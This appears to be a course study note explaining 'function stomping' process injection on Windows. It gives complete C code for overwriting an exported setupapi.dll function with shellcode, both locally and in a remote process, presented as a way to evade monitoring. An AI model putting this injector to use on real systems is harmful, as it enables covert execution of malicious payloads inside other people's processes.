---
icon: stomach
coverY: 0
---

# Function Stomping Injection

## Function Stomping Injection

> **Prerequisites:** Basic understanding of C, Windows processes, memory management, and WinAPI functions like `VirtualAlloc`, `WriteProcessMemory`, etc.

***

### What is Function Stomping?

Before we had function stomping, techniques like mapping injection were used mainly to avoid suspicious WinAPI calls like `VirtualAlloc/Ex`. Function stomping takes a different approach entirely.

`Stomping` simply means overwriting the memory of an existing function with something else in our case, a shellcode payload. Instead of allocating new memory, we hijack memory that's already there, already executable, and already looks legitimate.

The idea is straightforward: every loaded DLL has functions sitting in memory. Those functions have addresses. What if we just amm write our payload over one of those functions? That's function stomping.

***

### Choosing the Right Function to Stomp

This is actually the most critical decision. You can't just pick any function overwriting something that Windows or your process calls internally (like functions in `ntdll.dll`, `kernel32.dll`, or `kernelbase.dll`) is a fast way to crash your process or trigger uncontrolled execution.

The rule of thumb: pick something obscure. A function that neither the OS nor your target process will ever call on its own. A classic example from the course is `SetupScanFileQueueA` from `setupapi.dll` it's exported, it's a real function, but almost nothing actually calls it day-to-day. Perfect target.

One more thing to keep in mind: once you stomp a function, it's gone. The original bytes are overwritten. So if your code calls that function for any other reason, it'll run your payload instead. Plan accordingly.

***

### Local Function Stomping

#### Theory

Okay so local stomping means we're doing this inside our **own process**. Nothing fancy going on here no remote handles, no cross-process stuff. Just us, messing with our own memory.

The steps basically go like this:

First we load the sacrificial DLL into our process using `LoadLibraryA`. Then we grab the address of our target function with `GetProcAddress`. Now here's the thing DLL memory by default isn't writable, so we have to call `VirtualProtect` first to flip the protection to `PAGE_READWRITE`. Once that's done, we just `memcpy` our payload right on top of the function's bytes. Then we call `VirtualProtect` again to make it executable. And finally we point a thread at that address and let it run.

That's literally it.

#### Code

```c
#include <windows.h>
#include <stdio.h>

#define SACRIFICIAL_DLL   "setupapi.dll"
#define SACRIFICIAL_FUNC  "SetupScanFileQueueA"

unsigned char Payload[] = { /* shellcode here */ };

int main() {
    DWORD dwOldProtection = NULL;
    PVOID pAddress        = NULL;
    HMODULE hModule       = NULL;
    HANDLE hThread        = NULL;
    BOOL bSTATE           = TRUE;

    printf("press enter to load \"%s\" ", SACRIFICIAL_DLL);
    getchar();

    // Step 1: Load the sacrificial DLL
    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL) {
        printf("[!] LoadLibraryA Failed with error %d \n", GetLastError());
        return -1;
    }
    printf("[+] DLL loaded\n");

    // Step 2: Get address of target function
    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL) {
        printf("[!] GetProcAddress Failed With Error %d \n", GetLastError());
        bSTATE = FALSE;
        goto Cleanup;
    }

    // Step 3: Make memory writable
    if (!VirtualProtect(pAddress, sizeof(Payload), PAGE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE;
        goto Cleanup;
    }

    // Step 4: Stomp the function with our payload
    memcpy(pAddress, Payload, sizeof(Payload));

    // Step 5: Make it executable
    if (!VirtualProtect(pAddress, sizeof(Payload), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE;
        goto Cleanup;
    }

    printf("[+] Press Enter To Run The Payload \n");
    getchar();

    // Step 6: Execute
    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread failed: %d\n", GetLastError());
        bSTATE = FALSE;
        goto Cleanup;
    }
    printf("[+] Thread created! Shellcode is running.\n");
    WaitForSingleObject(hThread, INFINITE);

Cleanup:
    if (hThread)  { CloseHandle(hThread);  hThread = NULL; }
    if (hModule)  { FreeLibrary(hModule);  hModule = NULL; }

    return bSTATE ? EXIT_SUCCESS : EXIT_FAILURE;
}
```

#### Code Walkthrough

**`LoadLibraryA`** loads `setupapi.dll` into our process. We need to do this because the DLL might not be loaded already, and we need its functions to actually exist in our memory before we can do anything with them.

**`GetProcAddress`** once the DLL is loaded, we use this to get the exact memory address where `SetupScanFileQueueA` lives. This is the address we're going to stomp.

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

**`VirtualProtect` (first call)**  DLL memory is readable by default, not writable. If you just try to `memcpy` into it without changing the protection, you'll get an access violation. So we change it to `PAGE_READWRITE` first.

**`memcpy`** this is where the actual stomping happens. We're copying our shellcode bytes directly on top of the function. After this line, `SetupScanFileQueueA` no longer exists at that address it's our payload now.

**`VirtualProtect` (second call)** we need the region to be executable so the CPU can actually run it. We mark it `PAGE_EXECUTE_READWRITE` here.

**`CreateThread`** we create a thread pointing to `pAddress`, which now holds our payload. Simple as that.

**`goto Cleanup`** just making sure handles and modules get properly closed/freed even if something fails halfway through. Cleaner than nesting a bunch of if-else blocks.

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

***

### Remote Function Stomping

#### Theory

Now that local stomping makes sense, remote is basically the same thing except we're doing it inside another process.

Here's something interesting about how Windows works that makes this possible: functions exported from DLLs have the same address across all processes. So if `SetupScanFileQueueA` is at address `0x7FF...` in our injector process, it'll be at that same address in Notepad, or Chrome, or whatever. Windows maps shared DLLs consistently across processes, so the address we get locally is valid remotely too.

So the trick is we get the function address locally using `GetProcAddress`, and then just use that same address when writing into the remote process. No extra searching inside the target needed.

But there's a catch.

#### Why We Need DLL Injection First

For the stomp to work, **the sacrificial DLL must already be loaded inside the target process**. Think about it if `setupapi.dll` isn't loaded in Notepad, then `SetupScanFileQueueA` simply doesn't exist anywhere in Notepad's memory. Writing to that address would just corrupt something random or crash the process.

So what do we do? We inject the DLL into the target process ourselves first. The `InjectDLL` function handles this it allocates memory in the remote process, writes the DLL path into it, then spawns a remote thread pointing at `LoadLibraryA` with the DLL path as the argument. Windows loads the DLL into the target just like the target called `LoadLibraryA` itself.

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Once that's done, `SetupScanFileQueueA` now exists in Notepad's memory at the same address we found locally, and we can safely stomp it.

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

#### Full Code

```c
#include <stdio.h>
#include <windows.h>
#include <psapi.h>

#define SACRIFICIAL_DLL   "setupapi.dll"
#define SACRIFICIAL_FUNC  "SetupScanFileQueueA"

unsigned char Payload[] = { /* shellcode here */ };


BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

    DWORD adwProcesses[1024 * 2],
          dwReturnLen1 = NULL,
          dwReturnLen2 = NULL,
          dwNmbrOfPids = NULL;

    HANDLE  hProcess = NULL;
    HMODULE hModule  = NULL;
    WCHAR   szProc[MAX_PATH];

    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
        printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);
    printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

    for (int i = 0; i < dwNmbrOfPids; i++) {
        if (adwProcesses[i] != NULL) {
            if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {
                if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
                    printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
                } else {
                    if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
                        printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
                    } else {
                        if (wcscmp(szProcName, szProc) == 0) {
                            wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", szProc, adwProcesses[i]);
                            *pdwPid    = adwProcesses[i];
                            *phProcess = hProcess;
                            break;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }

    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
        return TRUE;
}

// AI Usage Disclosure: This Function Below was generated with DeepSeek and reviewed/modified by (me(Uday)).
BOOL InjectDLL(HANDLE hProcess, LPCSTR szDllPath) {

    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, strlen(szDllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMem) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMem, szDllPath, strlen(szDllPath) + 1, NULL)) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
    );

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemoteMem, 0, NULL);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);

    printf("[+] DLL Injected Successfully\n");
    return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {

    HANDLE  hProcess              = NULL;
    HANDLE  hThread               = NULL;
    PVOID   pAddress              = NULL;
    DWORD   dwProcessId           = NULL;
    HMODULE hModule               = NULL;
    DWORD   dwOldProtection       = NULL;
    SIZE_T  sNumberOfBytesWritten = NULL;

    if (argc < 2) {
        wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
        return -1;
    }

    // Step 1: Find the target process
    wprintf(L"[@] Searching For Process Id Of \"%s\" ", argv[1]);
    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        printf("[!] Process is Not Found \n");
        return -1;
    }
    printf("[+] Found Target Process Pid: %d \n", dwProcessId);

    // Step 2: Inject setupapi.dll into target process
    printf("[+] Injecting %s into target process... \n", SACRIFICIAL_DLL);
    if (!InjectDLL(hProcess, "C:\\Windows\\System32\\setupapi.dll")) {
        printf("[!] Failed to inject DLL\n");
        return -1;
    }

    Sleep(1000);

    // Step 3: Load setupapi.dll locally to get function address
    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL) {
        printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Step 4: Get the function address — same in remote process
    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);
    getchar();

    // Step 5: Make remote function memory writable
    if (!VirtualProtectEx(hProcess, pAddress, sizeof(Payload), PAGE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Step 6: Write payload over the function in remote process
    if (!WriteProcessMemory(hProcess, pAddress, Payload, sizeof(Payload), &sNumberOfBytesWritten)
        || sizeof(Payload) != sNumberOfBytesWritten) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        printf("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sizeof(Payload));
        return FALSE;
    }

    // Step 7: Mark as executable
    if (!VirtualProtectEx(hProcess, pAddress, sizeof(Payload), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press Enter To Run The Payload ");
    getchar();

    // Step 8: Execute
    hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf("[#] Press Enter To Quit ");
    getchar();

    return 0;
}
```

#### Code Walkthrough

There are three separate pieces in this file so let me go through each one:

**`GetRemoteProcessHandle`** loops through every running process using `EnumProcesses`, opens a handle to each one, grabs its name with `GetModuleBaseName`, and compares it against what we passed in on the command line. When it finds a match it hands back the PID and process handle by reference. Nothing special, just process enumeration.

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

**`InjectDLL`** this is the part that loads `setupapi.dll` into the target. Allocates a small chunk of memory in the remote process with `VirtualAllocEx`, writes the DLL path string into it with `WriteProcessMemory`, then calls `CreateRemoteThread` pointing at `LoadLibraryA` with our DLL path as the argument. The remote process basically calls `LoadLibraryA("C:\\Windows\\System32\\setupapi.dll")` on our behalf. We need this step specifically because Notepad doesn't load `setupapi.dll` on its own so without this, the function we want to stomp doesn't exist in the target yet.

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

**`wmain`** this is where everything ties together. Find the process → inject the DLL → load the DLL locally to get the function address → `VirtualProtectEx` to make it writable → `WriteProcessMemory` to stomp it → `VirtualProtectEx` again to make it executable → `CreateRemoteThread` to run it.

One thing worth pointing out we call `LoadLibraryA` locally in our own process too (Step 3), not just remotely. We do this purely to get the function address via `GetProcAddress`. We're not using the local copy for anything else we just need that address number, which as explained earlier will be the same in the remote process.

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

***

### Quick Comparison

The whole point of function stomping over traditional injection is avoiding `VirtualAlloc/Ex`  instead of asking Windows for new suspicious executable memory, you're reusing memory that's already there and already looks legitimate to anything monitoring the process.
